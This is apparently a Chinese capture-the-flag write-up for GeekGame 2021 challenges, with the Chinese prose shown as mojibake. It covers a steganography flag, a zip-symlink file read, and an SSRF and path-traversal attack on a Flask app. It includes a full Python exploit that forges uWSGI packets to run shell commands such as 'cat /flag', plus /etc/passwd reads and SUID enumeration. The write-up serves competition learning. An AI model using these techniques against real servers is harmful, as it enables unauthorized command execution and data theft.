\"\\u001b[01;32mroot@you-kali-vm\\u001b[00m:\\u001b[01;34m~/course/geekgame\\u001b[00m# \"]..[\"stdout\", \"7\"]..[\"stdout\", \"z\"]..[\"stdout\", \"a\"]..[\"stdout\", \" \"]..[\"stdout\", \"a\"]..[\"stdout\", \" \"]..[\"stdout\", \"f\"]..[\"stdout\", \"l\"]..[\"stdout\", \"a\"]..[\"stdout\", \"g\"]..[\"stdout\", \"2\"]..[\"stdout\", \".\"]....[\"stdout\", \"7\"]..[\"stdout\", \"z\"]..[\"stdout\", \" \"]..[\"stdout\", \"f\"]..[\"stdout\", \"l\"]..[\"stdout\", \"a\"]..[\"stdout\", \"g\"]..[\"stdout\", \"2\"]..[\"stdout\", \".\"]..[\"stdout\", \"w\"]..[\"stdout\", \"a\"]..[\"stdout\", \"v\"]..[\"stdout\", \" \"]..[\"stdout\", \"-\"]..[\"stdout\", \"p\"]..[\"stdout\", \"\\\"\"]..[\"stdout\", \"\\\"\"]..[\"stdout\", \"\\b\"]..[\"stdout\", \"W\\\"\\b\"]..[\"stdout\", \"a\\\"\\b\"]..[\"stdout\", \"k\\\"\\b\"]..[\"stdout\", \"a\\\"\\b\"]..[\"stdout\", \"r\\\"\\b\"]..[\"stdout\", \"i\\\"\\b\"]..[\"stdout\", \"m\\\"\\b\"]..[\"stdout\", \"a\\\"\\b\"]..[\"stdout\", \"s\\\"\\b\"]..[\"stdout\", \"u\\\"\\b\"]..[\"stdout\", \"!\\\"\\b\"]..[\"stdout\", \" \\\"\\b\"]..[\"stdout\", \"`\\\"\\b\"]..[\"stdout\", \"d\\\"\\b\"]..[\"stdout\", \"a\\\"\\b\"]..[\"stdout\", \"t\\\"\\b\"]..[\"stdout\", \"e\\\"\\b\"]..[\"stdout\", \"`\\\"\\b\"]..[\"stdout\", \" \\\"\\b\"]..[\"stdout\", \"`\\\"\\b\"]..[\"stdout\", \"u\\\"\\b\"]..[\"stdout\", \"n\\\"\\b\"]..[\"stdout\", \"a\\\"\\b\"]..[\"stdout\", \"m\\\"\\b\"]..[\"stdout\", \"e\\\"\\b\"]..[\"stdout\", \" \\\"\\b\"]..[\"stdout\", \"-\\\"\\b\"]..[\"stdout\", \"n\\\"\\b\"]..[\"stdout\", \"o\\\"\\b\"]..[\"stdout\", \"m\\\"\\b\"]..[\"stdout\", \"`\\\"\\b\"]..[\"stdout\", \" \\\"\\b\"]..[\"stdout\", \"`\\\"\\b\"]..[\"stdout\", \"n\\\"\\b\"]..[\"stdout\", \"p\\\"\\b\"]..[\"stdout\", \"r\\\"\\b\"]..[\"stdout\", \"o\\\"\\b\"]..[\"stdout\", \"c\\\"\\b\"]..[\"stdout\", \"`\\\"\\b\"]..[\"stdout\", \"\\r\\n\"].~..[\"stdout\", \"\\r\\n7-Zip (a) [64] 16.02 : Copyright (c) 1999-2016 Igor Pavlov : 2016-05-21\\r\\np7zip Version 16.02 (locale=en_US.utf8,Utf16=on,HugeFiles=on,64 bits,8 CPUs Intel(R) Core(TM) i7-10510U CPU @ 1.80GHz (806EC),ASM,AES-NI)\\r\\n\\r\\n\"].~..[\"stdout\", \"Scanning the drive:\\r\\n 0M Scan \\b\\b\\b\\b\\b\\b\\b\\b\\b\\b \\b\\b\\b\\b\\b\\b\\b\\b\\b\\b1 file, 4763436 bytes (4652 KiB)\\r\\n\\r\\nCreating archive: flag2.7z\\r\\n\\r\\nItems to compress: 1\\r\\n\\r\\n\"]..[\"stdout\", \" 0%\"].2[\"stdout\", \"\\b\\b\\b\\b \\b\\b\\b\\b 3% + flag2.wav\"].n[\"stdout\", \"\\b\\b\\b\\b\\b\\b\\b\\b\\b\\b\\b\\b\\b\\b\\b\\b \\b\\b\\b\\b\\b\\b\\b\\b\\b\\b\\b\\b\\b\\b\\b\\b 29% + flag2.wav\"].p[\"stdout\", \"\\b\\b\\b\\b\\b\\b\\b\\b\\b\\b\\b\\b\\b\\b\\b\\b \\b\\b\\b\\b\\b\\b\\b\\b\\b\\b\\b\\b\\b\\b\\b\\b 57% 1 + flag2.wav\"].z[\"stdout\", \"\\b\\b\\b\\b\\b\\b\\b\\b\\b\\b\\b\\b\\b\\b\\b\\b\\b\\b \\b\\b\\b\\b\\b\\b\\b\\b\\b\\b\\b\\b\\b\\b\\b\\b\\b\\b 82% 1 + flag2.wav\"].~..[\"stdout\", \"\\b\\b\\b\\b\\b\\b\\b\\b\\b\\b\\b\\b\\b\\b\\b\\b\\b\\b \\b\\b\\b\\b\\b\\b\\b\\b\\b\\b\\b\\b\\b\\b\\b\\b\\b\\b\\r\\nFiles read from disk: 1\\r\\nArchive size: 2935226 bytes (2867 KiB)\\r\\nEverything is Ok\\r\\n\"].`[\"stdout\", \"\\u001b[01;32mroot@you-kali-vm\\u001b[00m:\\u001b[01;34m~/course/geekgame\\u001b[00m# \"].... è¿˜å¥½ä¸å¤šï¼Œé‚£å°±äººå·¥æå–ä¸€ä¸‹ pip3 install stego-lsb # stegolsb wavsteg balabala # åæ­£æ˜¯æŠŠ flag2.txt å†™å…¥ wav éŸ³é¢‘ wavsteg -h -i ki-ringtrain.wav -s flag2.txt -o flag2.wav 7z a flag2.7z flag2.wav -p\"Wakarimasu! `date` `uname -nom` `nproc`\" uname -nom å¾ˆæ˜æ˜¾æ˜¯ you-kali-vm x86_64 GNU/Linux nproc é€šè¿‡ä¸Šé¢ 7z çš„æ‰§è¡Œè¿‡ç¨‹ 8 CPUs å¯ä»¥çŸ¥é“æ˜¯ 8. date æ ¹æ®æµé‡åŒ…çš„æ—¶é—´æˆ³å¯ä»¥å¾—åˆ°å¤§æ¦‚æ—¶é—´æ˜¯ Nov 6, 2021 15:44:15.190826000 ä¸­å›½æ ‡å‡†æ—¶é—´ è¿™é™„è¿‘ã€‚ ç„¶è€Œè¿™ä¸ªçš„æ ¼å¼ä¸çŸ¥é“å•Šï¼Œè¯•äº†å‡ ç§å¸¸è§çš„ï¼Œè€åŠå¤©éƒ½ä¸å¯¹å•Šâ€¦â€¦ å†æ ¹æ®æç¤º ç¬¬äºŒé˜¶æ®µæç¤º Flag 1. You é…±åœ¨ä¸€è¾¹æŒ‚ç€ B ç«™ç›´æ’­é—´ä¸€è¾¹ä½¿ç”¨ Jupyter Notebook å‡ºé¢˜ï¼Œä½ åªéœ€å…³å¿ƒåè€… Flag 2. You é…±å‰å‡ å¤©åœ¨æœåŠ¡å™¨ä¸Šè¿è¡Œäº†å‘½ä»¤ dateï¼Œå¹¶æŠŠè¾“å‡ºåˆ†äº«ç»™äº†ä½ ï¼šSat 06 Nov 2021 11:45:14 PM CST æœ€åå¾—åˆ°å¯†ç æ˜¯ Wakarimasu! Sat 06 Nov 2021 03:44:15 PM CST you-kali-vm x86_64 GNU/Linux 8 ï¼ˆä¸ºå•¥æˆ‘ä¸ç›´æ¥åœ¨ kali é‡Œæ•² date è¯•è¯•å•Šï¼Œè‰ è§£å‹å¾—åˆ° flag2.wav æ ¹æ®ä¸Šé¢çš„è¾“å…¥ï¼Œå¯ä»¥çŸ¥é“ç”¨äº† stego-lsb è¿™ä¸ª pypi åº“ã€‚ å‚è€ƒæ–‡æ¡£å°†å…¶æ¢å¤å‡ºæ¥ã€‚ $ stegolsb wavsteg -r -i flag2.wav -o output.txt -n 1 -b 1000 Files read in 0.01s Recovered 1000 bytes in 0.00s Written output file in 0.00s $ cat output.txt 788c3a128994e765373cfc171c00edfb3f603b67f68b087eb69cb8b8508135c5b90920d1b344 ç„¶åå†è¿˜åŸä¸€ä¸‹å¾—åˆ° flagã€‚ flag2_en = binascii.unhexlify(\"788c3a128994e765373cfc171c00edfb3f603b67f68b087eb69cb8b8508135c5b90920d1b344\") flag2_de = xor_each(flag2_en, key1) print(flag2_de) flag{ffdbca6ecc5d86cb71cadfd43df36649} åœ¨çº¿è§£å‹ç½‘ç«™ Q å°ç½‘ç›˜å¯ä»¥åœ¨çº¿é¢„è§ˆå¤šç§æ–‡ä»¶ï¼Œä½†æ˜¯å”¯ç‹¬å‹ç¼©æ–‡ä»¶ä¸èƒ½åœ¨çº¿è§£å‹ã€‚è¿™è®©å° A ååˆ†éš¾å—ã€‚ ä¸ºäº†è§£å†³è¿™ä¸ªé—®é¢˜ï¼Œå° A å†™äº†ä¸€ä¸ªåœ¨çº¿è§£å‹ç½‘ç«™ã€‚åªè¦ä½ ä¸Šä¼ zipæ–‡ä»¶åˆ°è¿™ä¸ªç½‘ç«™ï¼Œå®ƒå°±ä¼šè‡ªåŠ¨å¸®ä½ è§£å‹ï¼Œä¹‹åä½ å°±å¯ä»¥è®¿é—®è§£å‹å‡ºæ¥çš„æ–‡ä»¶äº†ã€‚é…åˆç€æµè§ˆå™¨æ’ä»¶ï¼Œå¯ä»¥å®Œç¾è§£å†³ Q å°ç½‘ç›˜çš„ç—›ç‚¹ã€‚ ä¸ºäº†è®©å¤§å®¶ç›¸ä¿¡ä»–çš„ç½‘ç«™æ˜¯å®‰å…¨çš„ï¼Œä¸ä¼šæŠŠå‹ç¼©æ–‡ä»¶å†…å®¹çš„æ³„æ¼ç»™å…¶ä»–äººï¼Œä»–åœ¨ç£ç›˜æ ¹ç›®å½•ä¸‹æ”¾äº†ä¸€ä¸ªå« flag çš„æ–‡ä»¶ï¼Œå£°ç§°åªè¦èƒ½æ‹¿åˆ°å…¶ä¸­å†…å®¹å°±å¯ä»¥è·å¾—ä¸€é¡¿ç«é”…ã€‚ä½ ä»¥ä»–çš„ç½‘ç«™åŠŸèƒ½å¹¶ä¸å®Œæ•´ä¸ºç†ç”±ï¼Œæƒ³éª—å–ä¸€é¡¿ç«é”…ã€‚ç„¶è€Œä»–åªæ˜¯è¡¨ç¤ºè¿™å¹¶ä¸å½±å“ç½‘ç«™çš„å®‰å…¨æ€§ï¼Œåªæœ‰æ”»ç ´ç½‘ç«™çš„äººæ‰èƒ½è·å¾—ç«é”…ã€‚ ä½ ååˆ†ç”Ÿæ°”ï¼Œé“äº†å¿ƒåœ°è¦åƒä¸Šè¿™é¡¿å…è´¹çš„ç«é”…ã€‚ ä½ å¯ä»¥ ä¸‹è½½æœ¬é¢˜çš„ç¨‹åº æºç å¦‚ä¸‹ã€‚ import os import json from shutil import copyfile from flask import Flask,request,render_template,url_for,send_from_directory,make_response,redirect from werkzeug.middleware.proxy_fix import ProxyFix from flask import jsonify from hashlib import md5 import signal from http.server import HTTPServer, SimpleHTTPRequestHandler os.environ['TEMP']='/dev/shm' app = Flask(\"access\") app.wsgi_app = ProxyFix(app.wsgi_app, x_for=1 ,x_proto=1) @app.route('/',methods=['POST', 'GET']) def index(): if request.method == 'POST': f=request.files['file'] os.system(\"rm -rf /dev/shm/zip/media/*\") path=os.path.join(\"/dev/shm/zip/media\",'tmp.zip') f.save(path) os.system('timeout -k 1 3 unzip /dev/shm/zip/media/tmp.zip -d /dev/shm/zip/media/') os.system('rm /dev/shm/zip/media/tmp.zip') return redirect('/media/') response = render_template('index.html') return response @app.route('/media/',methods=['GET']) @app.route('/media',methods=['GET']) @app.route('/media/&lt;path&gt;',methods=['GET']) def media(path=\"\"): npath=os.path.join(\"/dev/shm/zip/media\",path) if not os.path.exists(npath): return make_response(\"404\",404) if not os.path.isdir(npath): f=open(npath,'rb') response = make_response(f.read()) response.headers['Content-Type'] = 'application/octet-stream' return response else: fn=os.listdir(npath) fn=[\"..\"]+fn f=open(\"templates/template.html\") x=f.read() f.close() ret=\"&lt;h1&gt;æ–‡ä»¶åˆ—è¡¨:&lt;/h1&gt;&lt;br&gt;&lt;hr&gt;\" for i in fn: tpath=os.path.join('/media/',path,i) ret+=\"&lt;a href='\"+tpath+\"'&gt;\"+i+\"&lt;/a&gt;&lt;br&gt;\" x=x.replace(\"HTMLTEXT\",ret) return x os.system('mkdir /dev/shm/zip') os.system('mkdir /dev/shm/zip/media') app.run(host=\"0.0.0.0\",port=8080,debug=False,threaded=True) å¯ä»¥çœ‹åˆ°å¯¹ä¸Šä¼ çš„å‹ç¼©åŒ…è¿›è¡Œäº†è§£å‹å¤„ç†ï¼Œè€Œåœ¨ /media/&lt;path&gt; è·¯ç”±ä¸‹è¯»å–äº†ç›¸åº”çš„æ–‡ä»¶ï¼Œå¹¶è¿”å›ç»™å‰ç«¯ã€‚ é‚£å°±å¾ˆç®€å•å•¦ï¼Œæ•´ä¸ª symbolic link ç¬¦å·é“¾æ¥åˆ° /flagï¼Œç„¶å zip å‹ç¼©æ‰“åŒ…è¿›å»å°±å®Œäº‹äº†ã€‚ zip / unzip çš„å‚æ•°ï¼ˆman pageï¼‰ -y Â­â€“symlinks For UNIX and VMS (V8.3 and later), store symbolic links as such in the zip archive, instead of compressing and storing the file referred to by the link. This can avoid multiple copies of files being included in the archive as zip recurses the directory trees and accesses files directly and by links. æ³¨æ„éœ€è¦åœ¨ Linux ä¸‹è¿›è¡Œæ“ä½œï¼ˆ ln -s /flag meowflag zip --symlink meowflag.zip meowflag ç„¶åä¸Šä¼ è¿™ä¸ªå‹ç¼©åŒ…ä¸Šå»ã€‚ ä¸‹è½½ä¸‹æ¥å°±æ˜¯ /flag flag{neV3r_trUSt_Any_c0mpresSed_File} æ—©æœŸäººç±»çš„èŠå¤©å®¤ You é…±æœ‰ç€äºŒåä¸€å¹´ç½‘é¾„ï¼Œå¥¹ä¾ç¨€è®°å¾—æœ€å¼€å§‹äººä»¬æ˜¯æ€ä¹ˆåœ¨ç½‘ä¸ŠèŠå¤©çš„ã€‚é‚£æ—¶çš„ç½‘é¡µèŠå¤©å®¤åŠŸèƒ½å•ä¸€ï¼Œæ‰€æœ‰çš„ä¿¡æ¯éƒ½æ˜¯çº¯æ–‡æœ¬ï¼Œä¸­æ–‡å­—ç¬¦ç”šè‡³éœ€è¦æ‰‹åŠ¨ç¼–ç ï¼Œæ‰èƒ½å‘é€åˆ°ç½‘ç»œçš„å¦ä¸€ç«¯ã€‚â€œä½ ä»Šå¤©åƒä»€ä¹ˆï¼Ÿâ€ äº²åˆ‡çš„é—®å€™é¡ºç€è¿™æ¡è™šæ‹Ÿçš„ä¿¡æ¯ç®¡é“ä¼ è¾¾åˆ°å…¨ä¸–ç•Œï¼Œå¯èƒ½è¿™å°±æ˜¯ ç®¡äººVPiper çš„é­…åŠ›å§ã€‚ ç°åœ¨çš„å¹´è½»äººä¼¼ä¹éƒ½ä¸æ‡‚è¿™ç§åŸå§‹çš„æ²Ÿé€šæ–¹å¼äº†ï¼ŒYou é…±å¾ˆä¼¤å¿ƒã€‚ä¸ºäº†é‡é“¸ ç®¡äººVPiper è£å…‰ï¼Œå¥¹ç”¨æœ€å–œæ¬¢çš„ Python åº“ Flask å†™äº†ä¸€ä¸ªæ¨¡æ‹Ÿæ—©æœŸèŠå¤©å®¤çš„ç½‘é¡µï¼Œå¸Œæœ›ä½ ä¹Ÿèƒ½ä½“ä¼šåˆ°å…¶ä¸­çš„ä¹è¶£ã€‚ You é…±è®°å¾—å¾ˆæ¸…æ¥šï¼Œç³»ç»Ÿä¸Šçº¿ä¹‹å‰åº”è¯¥å…³é—­è°ƒè¯•å¼€å…³ï¼Œè®¾ç½®æ­£ç¡®çš„æƒé™ï¼Œå¹¶ä¸”ç”¨ uwsgi ä»£æ›¿ Flask çš„è‡ªå¸¦æœåŠ¡å™¨ã€‚Flag æ–‡ä»¶ä½äºç£ç›˜çš„æ ¹ç›®å½•ï¼Œå³ /flagã€‚ ç‚¹å‡» â€œæ‰“å¼€/ä¸‹è½½é¢˜ç›®â€ è¿›å…¥é¢˜ç›®ç½‘é¡µ è¡¥å……è¯´æ˜ï¼šåˆæ¬¡è®¿é—®æ—¶å¯èƒ½é‡åˆ° 502 é”™è¯¯ï¼Œè¿™æ˜¯å› ä¸ºåç«¯å°šæœªå¯åŠ¨å®Œæˆï¼Œç­‰å‡ ç§’ååˆ·æ–°å³å¯ å®é™…ä¸Šå°±æ˜¯ä¸ª SSRF çš„å…¥å£ã€‚ éšä¾¿å‘ç‚¹ä¸œè¥¿ï¼Œè¿”å›çš„åªæ˜¯å›ºå®šæœ‰é™çš„å‡ ä¸ªç»“æœï¼Œæ²¡å•¥ç”¨çš„äºšå­ã€‚ ç»™äº†æºç  app.py from flask import Flask, redirect, Response, request, render_template import utils, base64 app = Flask(__name__) @app.route('/', methods=['GET', 'POST']) def index(): data = {} data['day'] = utils.get_today() data['server_addr'] = utils.get_default_server() if request.method == 'POST': data['server_addr'] = request.form['server'] data['content'] = request.form['content'] try: base64.b64decode(data['content'].strip(), validate=True) except: data['content'] = base64.b64encode(data['content']) data['response'] = utils.send_msg(data['server_addr'], base64.b64decode(data['content'])) utils.write_chat_log(data['content'], data['response']) return render_template('chatbot.html', data=data) @app.route('/module', methods=['GET']) def module(): if 'name' in request.args: page = request.args.get('name') else: page = 'chatlog' data = {} if 'chatlog' == page: try: logfile = request.args.get('log') \\ or 'chat_log_%s' % utils.get_today() log = open('media/{}'.format(logfile)).read() except: log = 'No chat log' data['log'] = log elif 'chatbot' == page: data['day'] = utils.get_today() else: return redirect('/') return render_template('{}.html'.format(page), data=data) @app.route('/src') def src(): with open(__file__, encoding='utf-8') as f: src = f.read() resp = Response(src) resp.headers['content-type'] = 'text/plain; charset=utf-8' return resp #app.run() æ ¹æ®æºç ï¼Œæˆ‘ä»¬å¯ä»¥æ„é€  payload å»è¯»å–ä»»æ„æ–‡ä»¶ã€‚ GET /module?log=../utils.py utils.py import socket from time import sleep from datetime import date from pprint import pformat def get_today(): return date.today().strftime('%Y_%m_%d') def var_dump(var): return pformat(var) def get_default_server(): return '127.0.0.1:1234' def send_msg(server_addr, msg): s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) s.settimeout(3) try: (ip, port) = server_addr.strip().split(':') s.connect((ip, int(port))) s.sendall(msg) sleep(1) r = s.recv(2048) s.close() return r.decode('utf8') except Exception as e: s.close() return str(e) def write_chat_log(send, recv): logfile = open('media/chat_log_{}'.format(get_today()), 'a+') logfile.writelines(['you sent ---&gt;\\n', send+'\\n', 'server replied &lt;---\\n', recv+'\\n']) å¯ä»¥çœ‹å‡ºæ˜¯é€šè¿‡ socket æŠŠè¾“å…¥ base64 decode ä¸€ä¸‹ï¼Œç„¶åå‘åŒ…ï¼Œå†æŠŠç»“æœè¿”å›ç»™å‰ç«¯ã€‚ åˆšå¼€å§‹ä»¥ä¸ºæ˜¯ flask SSTIï¼Œäºæ˜¯è¯»äº†è¯»æ¨¡æ¿ templates/chatbot.html &lt;!doctype html&gt; &lt;title&gt;Chat Bot!&lt;/title&gt; &lt;link rel=\"stylesheet\" href=\"{{ url_for('static', filename='style.css') }}\"&gt; &lt;section class=\"content\"&gt; &lt;form method=\"post\"&gt; &lt;label for=\"server\"&gt;Chatbot Address&lt;/label&gt; &lt;input name=\"server\" type=\"text\" id=\"server\" value=\"{{ data.server_addr }}\" required&gt; &lt;label for=\"content\"&gt;Chat window (base64 encoded)&lt;/label&gt; &lt;textarea name=\"content\" rows=\"22\" cols=\"80\" id=\"content\"&gt;{{ data.content }}&lt;/textarea&gt; &lt;br /&gt; &lt;label for=\"response\"&gt;Chatbot response (base64 encoded)&lt;/label&gt; &lt;textarea name=\"response\" rows=\"22\" cols=\"80\" id=\"response\" readonly&gt;{{ data.response }}&lt;/textarea&gt; &lt;input type=\"submit\" value=\"submit\"&gt; &lt;/form&gt; &lt;p&gt;&lt;a href=\"/module?name=chatlog&amp;log=chat_log_{{ data.day }}\"&gt;Click to view chat log&lt;/a&gt;&lt;/p&gt; &lt;p&gt;&lt;a href=\"/src\"&gt;Open source&lt;/a&gt;&lt;/p&gt; &lt;/section&gt; ç„¶è€Œè¯•äº†è€åŠå¤©ä¹Ÿæ²¡æˆåŠŸæ³¨å…¥è¿™ä¸ª data.content æˆ–è€… data.responseã€‚ è¿˜æƒ³äº†èƒ½ä¸èƒ½æ„é€ ä¸ªé”™è¯¯è¯·æ±‚ï¼Œåœ¨ url é‡Œé™„å¸¦ {{}} è¿™ç§ï¼Œç„¶è€Œå‘ç°åç«¯ç”¨çš„ nginx å¥— uwsgiï¼Œè¯·æ±‚çš„ url å¹¶ä¸ä¼šå‡ºç°åœ¨ response ä¸­ï¼Œé‚ä½œç½¢ã€‚ è¯•äº†è¯•æ˜¯å¯ä»¥è¯»åˆ° /etc/passwd ä¹‹ç±»çš„ï¼Œäºæ˜¯æƒ³çœ‹çœ‹è¿™ä¸ªé»˜è®¤çš„ 1234 ç«¯å£å¯¹åº”å•¥ç¨‹åºï¼Œä»¥åŠå½“å‰è¿è¡Œçš„æœ‰å•¥ä¸œè¥¿ï¼Œä¹Ÿå°±æ˜¯ä¿¡æ¯æ”¶é›†å•¦ã€‚ å…ˆè¯»äº†è¯» /proc/self/cmdlineï¼Œç„¶åçˆ†ç ´äº† /proc/&lt;pid&gt;/cmdlineï¼Œå†ä¾æ¬¡å»è¯»ç›¸åº”çš„é…ç½®æ–‡ä»¶ã€‚ chatbot.py çœ‹èµ·æ¥æ²¡å•¥ç”¨ï¼Œåªæ˜¯ä¸ºäº†é»˜è®¤çš„ 1234 ç«¯å£çš„å“åº”ç½¢äº†ã€‚ #!/usr/bin/env python #coding:utf-8 import socketserver import base64, random class ChatBotServer(socketserver.BaseRequestHandler): def handle(self): conn = self.request while True: data = conn.recv(2048).decode('utf8') if data.strip() == \"exit\": print(\"æ–­å¼€ä¸%sçš„è¿æ¥ï¼\" % (self.client_address,)) conn.sendall((b\"%s\\n\" % base64.b64encode('Goodbye!'))) break r = [b'Hello!', b'Alola!', b'Nice to meet you.', b'What a wonderful game!', b'Try again and harder!', b'Good luck to you!'] conn.sendall((b\"%s\\n\" % base64.b64encode(random.choice(r)))) break if __name__ == '__main__': server = socketserver.ThreadingTCPServer(('127.0.0.1', 1234), ChatBotServer) print(\"å¯åŠ¨ChatBotï¼\") server.serve_forever() ç¡®å®æ²¡å•¥ç”¨ supervisor-ctf.conf [supervisord] logfile=/tmp/supervisord.log ; main log file; default $CWD/supervisord.log logfile_maxbytes=50MB ; max main logfile bytes b4 rotation; default 50MB logfile_backups=0 ; # of main logfile backups; 0 means none, default 10 loglevel=info ; log level; default info; others: debug,warn,trace pidfile=/tmp/supervisord.pid ; supervisord pidfile; default supervisord.pid nodaemon=true ; start in foreground if true; default false silent=false ; no logs to stdout if true; default false minfds=1024 ; min. avail startup file descriptors; default 1024 minprocs=200 ; min. avail process descriptors;default 200 [program:uwsgi] command=uwsgi --ini /tmp/uwsgi-ctf.ini user=root autorestart=true autostart=true startretries=3 redirect_stderr=true startsecs=5 stdout_logfile=/tmp/supervisor.log stopasgroup=true killasgroup=true priority=999 [program:chatbot] command=python /usr/src/ufctf/chatbot.py user=nobody autorestart=true autostart=true startretries=3 redirect_stderr=true startsecs=5 stdout_logfile=/tmp/supervisor.log stopasgroup=true killasgroup=true priority=999 uwsgi-ctf.ini [uwsgi] socket = :3031 chdir = /usr/src/ufctf manage-script-name = true mount = /=app:app master = true uid = nobody gid = nogroup workers = 2 buffer-size = 65535 enable-threads = true pidfile = /tmp/uwsgi.pid GET /module?log=../run.sh #!/bin/sh cd /usr/src/ufctf cp /flagtmp /flag echo \"\" &gt; /flagtmp chown nobody -R . \\ &amp;&amp; chmod 0666 -R /tmp/* \\ &amp;&amp; chown root:root /flag \\ &amp;&amp; chmod 0600 /flag socat UNIX-LISTEN:/sock/socat.sock,fork,reuseaddr TCP4:127.0.0.1:8080 &amp; nginx -c /etc/nginx/nginx.conf exec supervisord -n -c /etc/supervisor-ctf.conf å¯ä»¥çœ‹å‡º uwsgi ç»‘å®šäº† 0.0.0.0:3031ï¼Œè€Œä¸” supervisor é‡Œ uwsgi æ˜¯ root ç”¨æˆ·è·‘çš„ï¼Œä½†å…¶ workers æ˜¯ nobodyã€‚ äºæ˜¯æ•´äº†è€åŠå¤©å°±å¡ä½äº†ã€‚ ç¬¬äºŒé˜¶æ®µæç¤º æŠŠ uwsgi ç«¯å£æš´éœ²ç»™åˆ«äººæ˜¯ä¸ªå±é™©çš„äº‹æƒ…ï¼Œå¯ä»¥è¢«ç”¨æ¥å¹²åäº‹ã€‚ æ­£ç¡®çš„æƒé™è®¾ç½®èƒ½é˜»æ­¢å¹²åäº‹ã€‚é”™è¯¯çš„æƒé™è®¾ç½®èƒ½ç”¨æ¥å¹²æ›´å¤šåäº‹ã€‚ æœç„¶æ˜¯ uWSGI å¼€äº†ç«¯å£çš„é”…ã€‚ å…¶åè®®ä¸­æœ‰ä¸€ä¸ªå‚æ•°UWSGI_FILEï¼Œå¯ä»¥ç”¨æ¥å¿½ç•¥åŸæœ‰uWSGIç»‘å®š Appï¼ŒåŠ¨æ€è®¾å®šä¸€ä¸ªæ–°çš„æ–‡ä»¶è¿›è¡ŒåŠ è½½æ‰§è¡Œã€‚è¿™æ˜¯ä¸€ä¸ªLFIçš„æ¼æ´ï¼Œå¯ä»¥ä»»æ„æ‰§è¡Œæœ¬åœ°å­˜åœ¨çš„ä»»ä½•æ–‡ä»¶ï¼Œå†ç»“åˆ uWSGI ç¨‹åºä¸­é»˜è®¤æ³¨å†Œçš„ä¸€ç³»åˆ— schemesï¼Œå…¶ä¸­æœ‰execåè®®ã€‚äºæ˜¯å¯ä»¥ç›´æ¥é€šè¿‡åˆšæ‰çš„UWSGI_FILEå˜é‡ä¼ å‚ï¼Œå¯¼è‡´è¿œç¨‹æ‰§è¡Œç³»ç»Ÿå‘½ä»¤ã€‚ é‚£å°±ç›´æ¥åˆ©ç”¨ hint é‡Œç»™çš„ exp æ¥ç”Ÿæˆ payload å¥½äº†ã€‚ åˆšå¼€å§‹è¿˜æ˜¯å…ˆç”Ÿæˆä¸€ä¸ªæ‰§è¡Œå‘½ä»¤ï¼Œè¾“å‡ºå†™å…¥åˆ°ä¸´æ—¶æ–‡ä»¶çš„ payloadï¼Œå†æ‰‹åŠ¨åœ¨æµè§ˆå™¨é‡Œæ‰§è¡Œï¼Œç„¶åå»è¯»è¿™ä¸ªä¸´æ—¶æ–‡ä»¶çš„ç»“æœã€‚æ•´äº†è€åŠå¤©å‘ç°è¿˜è¯»ä¸åˆ° flagï¼Œå¾ˆéš¾å—ï¼Œäºæ˜¯æœ€åå¿ƒæ€å´©äº†ï¼Œå¹²è„†æŠŠäº¤äº’è¿‡ç¨‹ä¸€èµ·å†™äº†å§ã€‚ã€‚ã€‚å”‰ï¼ˆ import re import time import base64 import sys import socket import argparse import requests def sz(x): s = hex(x if isinstance(x, int) else len(x))[2:].rjust(4, '0') # if sys.version_info[0] == 3: import bytes s = bytes.fromhex(s) if sys.version_info[0] == 3 else s.decode('hex') return s[::-1] def pack_uwsgi_vars(var): pk = b'' for k, v in var.items() if hasattr(var, 'items') else var: pk += sz(k) + k.encode('utf8') + sz(v) + v.encode('utf8') result = b'\\x00' + sz(pk) + b'\\x00' + pk return result def parse_addr(addr, default_port=None): port = default_port if isinstance(addr, str): if addr.isdigit(): addr, port = '', addr elif ':' in addr: addr, _, port = addr.partition(':') elif isinstance(addr, (list, tuple, set)): addr, port = addr port = int(port) if port else port return (addr or '127.0.0.1', port) def get_host_from_url(url): if '//' in url: url = url.split('//', 1)[1] host, _, url = url.partition('/') return (host, '/' + url) def fetch_data(uri, payload=None, body=None): if 'http' not in uri: uri = 'http://' + uri s = requests.Session() # s.headers['UWSGI_FILE'] = payload if body: import urlparse body_d = dict(urlparse.parse_qsl(urlparse.urlsplit(body).path)) d = s.post(uri, data=body_d) else: d = s.get(uri) return { 'code': d.status_code, 'text': d.text, 'header': d.headers } def ask_uwsgi(addr_and_port, mode, var, body=''): if mode == 'tcp': s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) s.connect(parse_addr(addr_and_port)) elif mode == 'unix': s = socket.socket(socket.AF_UNIX) s.connect(addr_and_port) s.send(pack_uwsgi_vars(var) + body.encode('utf8')) response = [] # Actually we dont need the response, it will block if we run any commands. # So I comment all the receiving stuff. # while 1: # data = s.recv(4096) # if not data: # break # response.append(data) s.close() return b''.join(response).decode('utf8') def curl(mode, addr_and_port, payload, target_url): host, uri = get_host_from_url(target_url) path, _, qs = uri.partition('?') if mode == 'http': return fetch_data(addr_and_port+uri, payload) elif mode == 'tcp': host = host or parse_addr(addr_and_port)[0] else: host = addr_and_port var = { 'SERVER_PROTOCOL': 'HTTP/1.1', 'REQUEST_METHOD': 'GET', 'PATH_INFO': path, 'REQUEST_URI': uri, 'QUERY_STRING': qs, 'SERVER_NAME': host, 'HTTP_HOST': host, 'UWSGI_FILE': payload, 'SCRIPT_NAME': target_url } return ask_uwsgi(addr_and_port, mode, var) def exp(command): print(command) host = \"https://prob17-vvm2kfjo.geekgame.pku.edu.cn/\" cmd = 'exec://' + command + \" &gt; /tmp/miao; echo test\" payload = curl('test', \"127.0.0.1:3031\", cmd, '/src') payload_b64 = base64.b64encode(payload) print(payload_b64) print(\"[*]Sending payload.\") r = requests.post( host, data={\"server\": \"127.0.0.1:3031\", \"content\": payload_b64}) print(r.status_code) time.sleep(0.25) print(\"[*]Receiving result.\") r = requests.get(host + '/module?log=../../../../../tmp/miao') print(r.status_code) # print(r.text) result = re.findall(r'&lt;textarea rows=\"50\" cols=\"80\"&gt;(.*?)&lt;/textarea&gt;', r.text, re.S) # print(result) print(result[0]) def main(): # command = \"pkill -9 uwsgi\" command = \"whoami\" command = \"cat /flag\" command = \"ps -ef\" exp(command) if __name__ == '__main__': main() ï¼ˆè¿™ä¸ª exp æ˜¯æœ€åæ”¹å¥½çš„äº† ls -al / å¥½ä¸å®¹æ˜“ RCE äº†ï¼Œä½†åˆä¸æ˜¯å®Œå…¨ RCEï¼Œè¿˜å¾—ææƒå•Šâ€¦â€¦ $ whoami nobody $ find / -perm -u=s -type f 2&gt;/dev/null /bin/su /bin/umount /bin/mount /usr/bin/passwd /usr/bin/chsh 